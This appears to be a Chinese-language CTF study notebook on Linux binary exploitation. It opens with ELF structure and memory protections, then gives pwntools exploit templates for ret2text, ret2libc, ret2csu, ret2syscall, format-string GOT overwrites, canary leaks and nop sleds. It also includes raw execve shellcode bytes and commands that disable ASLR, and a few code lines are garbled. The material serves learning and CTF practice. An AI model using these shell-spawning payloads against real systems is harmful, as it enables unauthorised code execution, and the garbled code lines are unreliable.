

# pwn

## 一，文件信息

### 1.elf文件解析：

#### elf文件：

作为Linux系统下的可执行文件。

ELF文件数据主要分为以下两个概念：
	1.segment：
		告诉内核如何映射内存
		包含：加载地址，文件范围，内存权限，对齐方式等信息
		运行时提供必要信息

​	2.section：
​		告诉链接器：那里是代码，哪里是可读数据，那里是重定位信息
​		每一个section文件都会包含其类型，文件中的位置，大小信息

​	a:segment和b:section的关系（相同权限的section会放入同一个segment）（一个segment包含许多section文件）（一个section可以属于多个segment）

​	用图标看ELF文件：

|                                                              |      ELF header      |
| :----------------------------------------------------------- | :------------------: |
| 每一个表项定义一个segment<br />a:只读segment<br />b:可读写segment | program header table |
| a                                                            |        .text         |
| a                                                            |       .rodata        |
| b                                                            |         ...          |
| b                                                            |        .data         |
| 每一个表项定义一个section                                    | section header table |

权限如：-r可读 -x可执行 -w可写。
RW(数据段)，RX(代码段)。

​	用图标看映射空间：

| 高位地址：0xffffffff | For Kernel       |
| -------------------- | ---------------- |
| 0xc0000000           | stack            |
|                      | ：向下写         |
|                      | shared libraries |
| 0x40000000           | ：向上写         |
|                      | heap             |
| RW：                 | data             |
| RX：                 | code             |
| 0x00000000           | unused           |

#### 程序数据：

​	程序数据是如何在内存中组织的

​    由c语言源码在编译链接执行，载入虚拟内存中

​	在x86和amd64中，默认使用小端位

​	    	小端序：低地址存放数据低位、高地址存放数据高位（低低高高）

​	 	   大端序：与小端序相反

​	内存：主存，断电即失效

​	寄存器：存放cpu当前使用的指令的暂存地址		![image-20231120143856252](https://gets-pwn.oss-cn-hangzhou.aliyuncs.com/image-20231120143856252.png)



### 2.程序执行流：

#### 寄存器：

 寄存器是处理器加工数据或运行程序的重要载体，用于存放程序执行中用到的数据和指令。 

 Intel 32位体系结构(简称IA32)处理器包含8个四字节寄存器 ， 最初的8086中寄存器是16位，每个都有特殊用途，寄存器名城反映其不同用途。 

 注意，EIP是个特殊寄存器，不能像访问通用寄存器那样访问它，即找不到可用来寻址EIP并对其进行读写的操作码(OpCode)。EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变) 

 当某个函数调用其他函数时，被调函数不会修改或覆盖主调函数稍后会使用到的寄存器值 

eip:指令指针

esp：栈顶

ebp：栈底



#### 栈帧：

 函数调用经常是嵌套的，在同一时刻，堆栈中会有多个函数的信息。每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)。**栈帧**是**堆栈**的逻辑片段，当调用函数时**逻辑栈帧**被压入堆栈, 当函数返回时逻辑栈帧被从堆栈中弹出。栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。 

 栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定(指针存放在相应寄存器中)。EBP指向当前栈帧底部(高地址)，在当前栈帧内位置固定； 

## 二，pwn基础

### 1.基础名词解释：

exploit：用于攻击的整个脚本和方案

payload：恶意数据流，攻击载荷‘

shellcode：获取对方shell的代码，多用于payload中

可执行文件：文件中数据是机械码的文件

### 2.gdb的使用：

**1.启动GDB：**gdb path/to/file  或者  gdb   file path/to/file

**2.设置断点break：** b 函数名  或者 b  地址

- 删除断点： delete

- 禁用断点： disable 

**3.运行程序run：** r

**4.继续运行程序在断点后continue：** c

**5.结束当前函数finish：** f

**6.退出程序调试quit：** q



### 3.ida的使用：

**1：**按f5进行反汇编
**2：** 按shift和f12---查看字符串
**3：** 选中变量或者函数按n，进行名字修改

### 4.保护机制：

**1.堆栈保护 (Stack: Canary found)：** 

​	 **Canary 值**通常是一个随机生成的数值，位于返回地址和局部变量之间。当函数执行结束时，栈上的 canary 值会被检查。如果 canary 值被修改，则表明发生了栈溢出，程序会终止或采取其他保护措施。 

​	**绕过方法**：
​		1.信息泄露： 泄漏出 canary 值（例如通过格式化字符串漏洞），就可以在执行栈溢出攻击时正确地写入 canary 值，从而绕过保护机制。 
​		2.无溢出控制：如果攻击者能够通过其他方式（如利用栈缓冲区中的数据构造一个 ROP 链）来绕过栈保护，那么仍然可能通过这种方式攻击。 

**2.NX（栈堆不可执行）：** 

​	是对内存区域进行保护，防止其中的内容被当做代码执行。它通常应用于栈、堆和其他数据段。此保护能够防止攻击者在栈上注入并执行恶意代码（例如缓冲区溢出攻击中注入 shellcode）。 

​	ROP（返回导向编程） 
​	JIT（即时编译）漏洞 

**3.PIE (Position Independent Executable)： **

 PIE 是一种编译选项，指示编译器生成位置无关的可执行文件。启用 PIE 后，程序的内存地址将不再是固定的，而是会在程序加载时随机化。 

**4. ASLR (Address Space Layout Randomization) ：**

​	 ASLR 随机化了程序的内存布局，包括栈、堆、堆栈和动态链接库（如 libc）。这使得攻击者无法预测程序加载时的内存地址，增加了攻击的难度。与 PIE 配合使用时，ASLR 可以显著增强系统的安全性。 

### 5.设置保护：

1.ASLR:

```python
#在Linux中，ALSR的全局配置/proc/sys/kernel/randomize_va_space有三种情况： 

#0表示关闭ALSR 

#1表示部分开启（将mmap的基址、stack和vdso页面随机化） 

#2表示完全开启

echo 0 > /proc/sys/kernel/randomize_va_space 可以写入这个配置文件， 禁用 ASLR 

echo 2 > /proc/sys/kernel/randomize_va_space
```

2.pie：

 要启用 **PIE (Position Independent Executable)**，通常需要在编译时使用特定的编译选项。 

### 6.python基础

#### 接收：

```python
#接收指定字符
io.recvuntil('[')
v5 = io.recvuntil(']', drop=True)
v5 = int(v5, 16)
#输入流中首先接收数据直到遇到 '[' 字符为止。
#接下来再次从输入流中接收数据，直到遇到 ']' 字符为止，将其保存在变量 v5 中。
#最后，将变量 v5 解析为一个十六进制的整数，并将其存储回变量 v5 中。



```

#### 输出：

```python
eval(可以计算算数式,可以执行代码)
strcmp()#接收到'\0'才会停止例如'catlove\0'

```



### 7.汇编基础

#### call指令：

假设我们调用一个call foo这个指令，那么我们有什么是必须做的呢？

有如下三个必须做的：

牢记foo结束后应从哪里继续执行（保存当前 **eip**下面的位置到栈中，即 **ret**）；

牢记上层函数的栈底位置（保存当前 **ebp** 的内容到栈中，即为old ebp）；

牢记foo函数栈开始的位置（保存当前栈顶的内容到 **ebp**，便于foo函数栈内的寻址）；

 ![img](https://img2020.cnblogs.com/blog/2547408/202109/2547408-20210916185441224-1475278617.png) 

 当foo函数执行结束时，**eip** 即将执行 **leave** 与 **ret** 两条指令恢复现场 

#### leave&retn

leave实质 上是mov esp,ebp和pop ebp，将栈底地址赋给栈顶，然后在重新设置栈底地址 

retn实质上是pop eip，设置下一条执行指令的地址

 

## 三，pwn的题型

### 栈溢出

#### ret2**

##### ret2text:

有backdoor函数（直接给权限），存在栈溢出，直接溢出攻击到指定位置。

```python
from pwn import *
elf = ELF('pwn')
backdoor = elf.sym['backdoor']

#32位ebp+4
payload = b'A'*(0x12+4)+p32(backdoor)

#64位要加ret地址在返回函数前
#64位rbp+8
payload = b'a'*(0x12+8)+p64(ret)+p64(backdoor)

io.sendline(payload)
```

有后门也可以溢出，但是有小心机，需要利用一定程序内部的变化去溢出到后门函数

**1.** 比如“I”->“IronMan”，最后在strcpy的时候发生了溢出，这里的溢出值要计算。

**2.** 在函数内部需要填写一些参数符合要求如：payload='a'*(0x6c+4) + p32(flag) + p32(0) + p32(0x36c) + p32(0x36d)



##### ret2system:

没有现成的backdoor但是有system函数和bin/sh字段可以调用，我们可以手动构建一个backdoor。

对于32位：

如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，使用 p32 函 数将整数值0转换为4字节的字符串。这个字符串将作为 system 函数的第二个参数，用于提供一个指向 空值的指针作为 system 函数的第二个参数。当然在这里使用其他任意4个字符进行覆盖也可以 如‘aaaa’,’bbbb’等均可。 p32(bin_sh) : 这部分使用 p32 函数将 bin_sh 的地址转换为一个4字节的字符串。 bin_sh 通常是指向包含要执行的命令的字符串（如 /bin/sh ）的指针。该字符串将作为 system 函数的第一个参数。 （可以看出参数是倒着一个个输入的）

对于64位：

与32位不同的是它的穿参方式不同，需要利用pop rdi和ret这两个指令实现参数传递

pop_rdi 指令用于将值从栈上弹出并存储到寄存器rdi中。在这个payload中，它用于准备传递 给 system 函数的第一个参数。

```python
#可以用sh代替bin/sh
#sh还可以等价于$0
#32位
system = elf.sym['system']
bin_sh = 0x8048750#查找地址

payload = 'a'*(0x12+4) + p32(system) + p32(0) + p32(bin_sh)
io.sendline(payload)

#64位
elf = ELF('./pwn')
system = elf.sym['system']
bin_sh = 0x400808
pop_rdi = 0x4007e3  # 0x00000000004007e3 : pop rdi ; ret
ret = 0x4004fe      # 0x00000000004004fe : ret 

payload = 'a'*(0xA+8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
io.sendline(payload)

```

```python
#当没有bin/sh和sh的字符串时，我们可以利用现有的发送去发送一个bin/sh
#或者也可以直接套板子ret2libc直接求解也是可以的
#32位
elf = ELF('./pwn')
system = elf.sym['system']
buf2 = 0x804B060 #bss段
gets = elf.sym['gets']
pop_ebx = 0x8048409     # 0x08048409 : pop ebx ; ret

payload = cyclic(0x6c+4) + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system) + 'aaaa' + p32(buf2)

io.sendline(payload) 
io.sendline("/bin/sh")
'''
1. cyclic(0x6c+4) : 这部分使用pwntools库中的 cyclic 函数生成一个循环模式的字符串，长
度为0x6c+4。循环模式字符串用于进行调试和定位溢出点。当然这里你也可以继续使用 ‘a’*
(0x6c+4)也是没有问题的。

2. p32(gets) : 这部分使用pwntools的 p32 函数将 gets 函数的地址转换为一个4字节的字符
串。它用于将 gets 函数的地址作为返回地址覆盖到栈上。使程序在溢出时调用 gets 函数。

3. p32(pop_ebx) : 这部分使用 p32 函数将 pop_ebx 的地址转换为一个4字节的字符串。

pop_ebx 是一个指令序列，用于将栈上的值弹出并存储到寄存器ebx中。

4. p32(buf2) : 这部分使用 p32 函数将 buf2 的地址转换为一个4字节的字符串。 buf2 是一个指
向存储输入数据的缓冲区的指针。

5. p32(system) : 这部分使用 p32 函数将 system 函数的地址转换为一个4字节的字符串。它将
用于将 system 函数的地址作为返回地址覆盖到栈上。

6. 'aaaa' : 这部分是一个4字节的字符串，用于填充栈上的返回地址的剩余空间。

7. p32(buf2) : 这部分使用 p32 函数将 buf2 的地址转换为一个4字节的字符串。它作为

pop_ebx 指令的参数，用于将 buf2 的地址加载到寄存器ebx中。
这个payload的目的是通过栈溢出漏洞控制程序的执行流程。它通过覆盖返回地址，将 gets 函数的
地址作为返回地址覆盖到栈上。然后使用 pop_ebx 指令将 buf2 的地址加载到寄存器ebx中，最后覆盖返
回地址为 system 函数的地址。通过这样的方式，可以执行 system(buf2) 来执行 buf2 指向的字符串所
表示的系统命令。
'''
#64位多了一个pop rdi和buf2的地址在gets函数前
#或者也可以直接套板子ret2libc直接求解也是可以的
elf = ELF('./pwn')
system = elf.sym['system']
buf2 = 0x602080
gets = elf.sym['gets']
pop_rdi = 0x4007f3     # 0x00000000004007f3 : pop rdi ; ret

payload = cyclic(0xA + 8) + p64(pop_rdi) + p64(buf2) + p64(gets) + p64(pop_rdi) + p64(buf2) + p64(system) + 'aaaa' + p64(buf2)

io.sendline(payload) 
io.sendline("/bin/sh")
```





##### ret2shcode

shellcode 一段小型的机器代码，用于在程序执行时执行特定的操作，通常用于利用漏洞（如缓冲区溢出）在目标系统上执行攻击代码。 在可执行区域。注入shellcode，跳转到可执行的shellcode。

```python
shellcode = asm(shellcraft.sh())
io.sendline(shellcode)
```

利用strcpy 函数不会检查目标缓冲区的大小。如果 input 字符串的
长度超过了 buf 数组的大小，就可能导致数据溢出到栈上其他部分。

```python

shellcode = asm(shellcraft.sh())
call_eax = p32(0x80484A0) #0x080484A0 : call eax
#0x20c=0x208+4;这个是溢出数值
payload = flat([shellcode,'a'*(0x20c-len(shellcode)),call_eax])
#call_eax是因为，要跳转回执行区域，在gdb中ctfshow函数的leave处下个断点，看程序返回时，缓冲区指向哪个寄存器。打好断点后运行程序，输入“show” 可以看到 EAX ,ECX ,EDX 寄存器是指向缓冲区的，然后我们去寻找call / jmp 指令：按照之前教大家的应该是用ROPgadget去寻找



```



##### ret2libc:

在很多时候，我们程序中肯定不会留出后门函数的，这时候，我们即没有system函数，也没有"\bin\sh"的字符串，这时候我们该如何利用漏洞呢？
比如说，我们在一个C语言程序中调用了printf函数，这个函数不是我们自己实现的，而是使用了链接库，但是这里有一个问题，使用链接库的时候，链接库所有的函数都被加载进来了，也就是说，system函数也被加载进来了，这时候我们就就可以使用system函数了。

**ps：** 1.要用它给的libc版本。例如：libc = LibcSearcher('write',write) 这个后面的write是接收的got的偏移量。

got表：globle offset table 全局偏移量表 

plt表：procedure link table 程序链接表 

根据：基地址 = 真实地址 - 偏移地址 ：获得基地址

有了基地址libc_addr，我们就可以寻找system函数和"/bin/sh"字符串的真实地址了： 

解题shil

1.首先寻找一个函数的真实地址，以puts为例。构造合理的payload1，劫持程序的执行流程，使得程序执行puts(puts@got)打印得到puts函数的真实地址，并重新回到main函数开始的位置。

2.找到puts函数的真实地址后，根据其最后三位，可以判断出libc库的版本（本文忽略，实际题目要用到LibcSearch库）。

3.根据libc库的版本可以很容易的确定puts函数的偏移地址。

4.计算基地址。基地址 = puts函数的真实地址 - puts函数的偏移地址。

5.根据libc函数的版本，确定system函数和"/bin/sh"字符串在libc库中的偏移地址。 

6.根据 真实地址 = 基地址 + 偏移地址 计算出system函数和"/bin/sh"字符串的真实地址。

7.再次构造合理的payload2，劫持程序的执行流程，劫持到system("/bin/sh")的真实地址，从而拿到shell。

32位：

```python
from pwn import *

p=processfrom pwn import *
e = ELF("./ret2libc3_32")
libc = ELF("/lib/i386-linux-gnu/libc.so.6") #确定libc库并解析
#libc = ELF("/path/to/libc.so.6")
p = process("./ret2libc3_32")
puts_plt = e.plt['puts'] #puts函数的入口地址
puts_got = e.got['puts']  #puts函数的got表地址
start_addr = e.symbols['_start'] #程序的起始地址
payload1 = b'a' * 112 + p32(puts_plt) + p32(start_addr) + p32(puts_got)
#attach(p, "b *0x0804868F")
#pause()
p.sendlineafter("Can you find it !?", payload1)
puts_real_addr = u32(p.recv()[0:4])  #接收puts的真实地址，占4个字节
print("puts_plt:{}, puts_got: {}, start_addr: {}".format(hex(puts_plt),hex(puts_got), hex(start_addr)))
print("puts_real_addr: ", hex(puts_real_addr)) 
libc_addr = puts_real_addr - libc.sym['puts'] #计算libc库的基地址
print(hex(libc_addr))
system_addr = libc_addr + libc.sym["system"] #计算system函数的真实地址
binsh_addr = libc_addr + next(libc.search(b"/bin/sh"))  #计算binsh字符串的真实地址
payload2 = b'a' * 112 + p32(system_addr) + b"aaaa" + p32(binsh_addr)
#pause()
p.sendline(payload2)
p.interactive()ret2libc3')
puts_plt = 0x08048460
puts_got = 0x0804A018
start_addr = 0x080484D0

payload1 = b'A'*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)
p.sendlineafter("!?",payload1)
puts_addr=u32(p.recv(4))

print("puts_addr:",hex(puts_addr))

offset_puts = 0x000732A0
offset_system = 0x00048170
offset_bin_sh = 0x001BD0D5
libc_system = puts_addr - offset_puts + offset_system
libc_bin_sh = puts_addr - offset_puts + offset_bin_sh

payload2 = b'a' * 112 + p32(libc_system) + p32(1234) + p32(libc_bin_sh)
p.sendlineafter("!?",payload2)
p.interactive()
```

64位：

```python
from pwn import *
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/home/feel/pypy/libc-2.31.so")
e=ELF("/home/feel/atta")
p = remote('8.147.132.32','15360')
pop_rdi_ret_addr = 0x400783
puts_plt = e.plt['puts'] #puts函数的入口地址
read_got = e.got['read']  #puts函数的got表地址
start_addr = e.symbols['_start'] #程序的起始地址
offset = 88
payload = b"a" * offset
payload += p64(pop_rdi_ret_addr)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(start_addr)
#attach(p,"b *0x40121e")
p.recvuntil(b"Welcome to NewStarCTF!!!!")
#pause()
p.send(payload)
read_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print("read_real_addr: ", hex(read_real_addr))
libc_base = read_real_addr - libc.sym["read"]
print("libc_base: ", hex(libc_base))
system_addr = libc_base + libc.sym["system"]
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
print("system_addr:{}".format(hex(system_addr)))
print("binsh_addr:{}".format(hex(binsh_addr)))
payload = b"a" * offset
payload += p64(0x400509) #需要添加一个ret，仅仅用于栈平衡
payload += p64(pop_rdi_ret_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)
p.recv()
p.send(payload)
p.interactive()
```

```python
#另类libc
elf = ELF("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
pop_rdi = 0x4008e3  # 0x00000000004008e3 : pop rdi ; ret
ret = 0x400576      # 0x0000000000400576 : ret
fgetc_got = elf.got['fgetc']
main = elf.sym['main']
puts_plt = elf.plt['puts']
payload = 'a'*(0x110 - 0x4) + '\x18' + p64(pop_rdi) + p64(fgetc_got) + 
p64(puts_plt) + p64(main)
io.sendlineafter("T^T\n", payload)
fgetc = u64(io.recv(6).ljust(8, "\x00"))
print hex(fgetc)
libc_base = fgetc - libc.sym['fgetc']
system_addr = libc_base + libc.sym['system']
bin_sh = libc_base + libc.search("/bin/sh").next()
print "libc_base = " + hex(libc_base)
payload = 'a'*(0x110 - 0x4) + '\x18' + p64(pop_rdi) + p64(bin_sh) + p64(ret) + 
p64(system_addr)
io.sendlineafter("T^T\n", payload)



```



##### ret2csu:

 在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。 

```python
#案例
from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level = 'debug'

level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = 'b' * 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil('Hello, World\n')
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))
##gdb.attach(sh)

## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')

sh.recvuntil('Hello, World\n')
## execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
```



##### password：

在很多题目中我们可以看见有一些password可以直接

```python
#puts遇到‘\x00’才停止
#将’n’替换成’x00’使得puts(v5)能正确输出输入的name，但如果输入了0x100个垃圾数据的话，会导
#致最后一个’n’并没有读入而导致程序在puts(v5)时会连带下面的password一起输出，这样我们就可以得
#到服务器上的password，所以会将password顺带着打印出来。

payload = """
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaa
ataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaa
bnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaa
chaaciaacjaackaaclaacmaacnaac
"""

io.sendline(payload)
io.recvuntil('aa,')
password = io.recv(33)
```



##### ret2syscall

利用系统调用号不只是简单调用system()

```python
#execve("/bin/sh",NULL,NULL)
#32位syscall
pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
io.sendline(payload)

#系统调用号，即 eax 应该为 0xb
#第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
#第二个参数，即 ecx 应该为 0
#第三个参数，即 edx 应该为 0
#64位syscall
pop_rax = 0x46b9f8 
pop_rdi = 0x4016c3 
pop_rdx_rsi = 0x4377f9 
bss = 0x6c2000 
ret = 0x45bac5 
payload  = cyclic(0x50+8) 
payload += p64(pop_rax)+p64(0x0) 
payload += p64(pop_rdx_rsi)+p64(0x10)+p64(bss) 
payload += p64(pop_rdi)+p64(0) 
payload += p64(ret) 
payload += p64(pop_rax)+p64(0x3b) 
payload += p64(pop_rdx_rsi)+p64(0)+p64(0) 
payload += p64(pop_rdi)+p64(bss) 
payload += p64(ret) 
io.sendline(payload) 
io.sendline("/bin/sh\x00")

#多函数调用
pop_eax = 0x080bb2c6 
pop_edx_ecx_ebx = 0x0806ecb0
bss = 0x080eb000
int_0x80 = 0x0806F350
payload = "a"*44
payload += p32(pop_eax)+p32(0x3)
payload += p32(pop_edx_ecx_ebx)+p32(0x10)+p32(bss)+p32(0)
payload += p32(int_0x80)
payload += p32(pop_eax)+p32(0xb)
payload += p32(pop_edx_ecx_ebx)+p32(0)+p32(0)+p32(bss)
payload += p32(int_0x80)
io.sendline(payload)
bin_sh = "/bin/sh\x00"
.sendline(bin_sh)
```

##### 多函数跳转：

利用溢出进行多个函数跳转和参数赋值：

```python
#32位
elf = ELF('./pwn')
flag_func1 = elf.sym['flag_func1']
flag_func2 = elf.sym['flag_func2']
flag = elf.sym['flag']

payload = "a" * (0x2c+4)
payload += p32(flag_func1)
payload += p32(flag_func2) + p32(flag) + p32(0xACACACAC) + p32(0xBDBDBDBD)#第二个参数给了flag()

```

利用函数的性质来进行跳转

```python
#ctfshow76
input_addr = 0x811EB40
shell = 0x8049284

payload = 'aaaa' + p32(shell) + p32(input_addr)
payload = payload.encode('base64')
#decode解码，encode编码
```



#### 格式化字符串

##### 工具：

-  payload = fmtstr_payload(偏移量, {改写地址: 写入的值}) 

- 字符串任意读脚本：

	```python
	#盲打
	#ctfshow99
	def leak(payload): 
	    io.remote()
		io.recv()  
		io.sendline(payload)   
		data = io.recvuntil('\n', drop=True)   
		if data.startswith('0x'):     
			print p64(int(data, 16))   
		io.close() 
	i =1
	while 1:   
		payload = '%{}$p'.format(i)   
		leak(payload)   
		i += 1
	```

##### printf漏洞：

- %p： `%p` 用于打印内存地址-- 指针的内存地址 
- %x： `%x` 会输出栈上的内容 -- 无符号整数的十六进制表示 
- %n： `%n` 将已经打印的字符数写入一个指针指向的内存位置 例子：printf("%x %x %x %x %n", &count); 会输出四个栈上的值，并且在输出完这些值后，`%n` 会将输出的字符总数写入 `count` 变量中 。



实现任意地址写：

```python
daniu = 0x804B038#目标地址
payload = fmtstr_payload(7,{daniu:6})#7是偏移量，6是写入的值
io.sendline(payload)
```

实现改变got值：

```python
#ctfshow94
offset = 6 
printf_got = elf.got['printf']#改变的
system_plt = elf.plt['system']#想要的
payload = fmtstr_payload(offset,{printf_got:system_plt})
io.sendline(payload)
io.recv()
io.sendline('/bin/sh\x00')


#ctfshow95 升级版，没有system
elf = ELF('./pwn')
printf_got = elf.got['printf']
payload = p32(printf_got) + '%6$s'
io.send(payload)
printf = u32(io.recvuntil('\xf7')[-4:])
libc = LibcSearcher('printf',printf)
libc_base = printf - libc.dump('printf')
system = libc_base + libc.dump('system')
log.info("system ===> %s" % hex(system))
payload = fmtstr_payload(6,{printf_got:system})
io.send(payload)
io.send('/bin/sh')

```

查询偏移量

```python
#ctfshow96
flag=''
for i in range(6,6+12):
    payload='%{}$p'.format(str(i))
    io.sendlineafter('$ ',payload)
    aim = unhex(io.recvuntil('\n',drop=True).replace('0x',''))
    flag += aim[::-1]
print flag
```

查找canary:

```python
elf = ELF('./pwn')
shell = elf.sym['__stack_check']
io.recv()
payload = "%15$x"
io.sendline(payload)
canary = int(io.recv(),16)
log.info("Canary : 0x%x" % canary)
payload = cyclic(0x28) + p32(canary) + 'A'*0xC + p32(shell)
io.sendline(payload)

```



#### shellcode：

##### 常见代码：

一段执行命令，一般由机械码构成，用于获取shell，和特殊东西。

```python
#汇编代码x86-架构
shellcode = asm(shellcraft.sh())
#32位
#:execve("/bin/sh", NULL, NULL)
shellcode=
""
push 0x68
push 0x732f2f2f   #这是字符串 "/bin/sh" 的前半部分字符的逆序表示，即 "sh//"。
push 0x6e69622f   #这是字符串 "/bin/sh" 的后半部分字符的逆序表示，即 "/bin"。
#这行代码将栈顶的地址（即字符串 "/bin/sh" 的起始地址）复制给寄存器 ebx 
mov ebx,esp
#这两行代码使用异或操作将 ecx 和 edx 寄存器的值设置为零。
xor ecx,ecx
xor edx,edx
#这两行代码将值 11 （ 0xb ）压入栈中，然后从栈中弹出到寄存器 eax
push 0xB 
pop eax
#这行代码触发中断 0x80 ，这是Linux系统中用于执行系统调用的中断指令。通过设置适当的寄存器值（ eax 、 ebx 、 ecx 、 edx ）， int 0x80 指令将执行 execve("/bin/sh", NULL, NULL) 系统调用，从而启动一个新的 shell 进程。
int 0x80
""

#64位

shellcode=
""
push rax
xor rdx, rdx
xor rsi, rsi
mov rbx,'/bin//sh'
push rbx
push rsp
pop rdi
#这行代码将 al 寄存器设置为值 59 , 59 是 execve 系统调用的系统调用号。
mov al, 59
#这行代码触发系统调用。
syscall
""

#32位短shellcode
#64位短shellcode
shellcode_x641="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
shellcode_x642="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

```

##### 特殊注意事项：

**leave:**  
leave的作用相当于MOV SP,BP；POP BP。
因为leave指令会释放栈空间，因此我们不能使用目标地址后面的24字节。
目标地址后的8个字节也不能存放（这里需要存放返回地址）。故我们的shellcode只能 放在目标首地址后的 24+8后的地址。

例如：溢出垃圾数据 +（可执行目标地址+32）+ shellcode

```python
payload = cyclic(0x10+8) + p64(v5 + 24+8) + shellcode
```

**mmap： ** 

buf = mmap(0, 0x400u, 7, 34, 0, 0); ：这行代码使用 mmap 函数分配一块内存区域，将其起 始地址保存在变量 buf 中。
此时在buf中的shellcode仍然可以执行。

**输入字符限定：**

对于shellcode进行字符筛选，我们只能使用有限的字符进行shellcode编写

使用pwntools生成一个shellcode，没法直接输出，有乱码，将shellcode重定向到一个文件中 切换 到alpha3目录中，使用alpha3生成string.printable 。string.printable，就是可见字符shellcode。

```
cd alpha3
python ./ALPHA3.py x64 ascii mixedcase rax --input="存储shellcode的文件" > 输出
文件
#存在检查：
shellcode = '\x00\xc0'  + asm(shellcraft.sh()) 
```

##### nop sled:

nop sled 是一种可以破解栈随机化的缓冲区溢出攻击方式。
攻击者通过输入字符串注入攻击代码。在实际的攻击代码前注入很长的 nop 指令 （无操作，仅使程 序计数器加一）序列， 只要程序的控制流指向该序列任意一处，程序计数器逐步加一，直到到达攻击代码的存在的地址， 并执行。

将 shellcode 填充为以 nop 指令开头 ( 0x90 )进行滑栈。

```python
#32位
#ctfshow 67
from pwn import *
context(arch='i386',os='linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28155)
shellcode = asm(shellcraft.sh())
payload = '\x90'*1336 + shellcode
io.recvuntil("The current location: 0x")
addr = u64(unhex(io.recvline(keepends=False).zfill(16)),endian='big')
print ("Addr: " + hex(addr))
io.recvuntil("> ")
io.sendline(payload)
io.recvuntil("> ")
sh = addr + 668 + 0x2d;
print("Sending: " + hex(sh))
io.sendline(hex(sh))
io.interactive()


#64位
#ctfshow 68
from pwn import *
context(arch='amd64',os='linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28121)
shellcode = asm(shellcraft.sh())
payload = b'\x90'*1336 + shellcode
io.recvuntil("The current location: 0x")
addr = u64(unhex(io.recvline(keepends=False).zfill(16)),endian='big')
print ("Addr: " + hex(addr))
io.recvuntil("> ")
io.sendline(payload)

io.recvuntil("> ")
sh = addr + 668 + 0x35;
print("Sending: " + hex(sh))

io.sendline(hex(sh))
io.interactive()


```

#### ROP

随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。
##### 简单ROP：

```shell
ROPgadget --binary pwn --ropchain
#上面是工具的自带生成rop工具 pwn是文件名
#利用这个生成的rop来写payload
```

```python
#例子1

p = cyclic(0x18+4)
p += pack('<I', 0x0806f02a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080b81c6) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f02a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080b81c6) # pop eax ; ret
